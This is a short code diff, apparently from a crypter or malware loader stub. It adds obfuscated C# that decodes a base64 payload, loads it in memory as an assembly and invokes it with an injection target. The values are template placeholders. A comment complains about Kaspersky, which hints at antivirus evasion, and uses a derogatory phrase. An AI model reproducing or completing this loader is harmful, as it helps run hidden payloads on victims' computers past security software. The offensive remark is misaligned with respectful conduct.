@@ -1,0 +1,4 @@
+string RPP24 = bAA1BCC1(AJJ8);
+byte[] RAA1P3 = Convert.FromBase64String(RPP24);
+//AA5BB1DD2KK4abc(RAA1P3, "[TYPE-NUMBER]", "Freaking Kaspersky was acting gay", true, "story", "[METHOD-NAME]", KKKKK1, "[INJECT-INTO]");
+Assembly.Load(RAA1P3).GetType("[TYPE-NUMBER]").InvokeMember("[METHOD-NAME]", BindingFlags.InvokeMethod, null, null, new object[] {KKKKK1, @injAA3AA2});
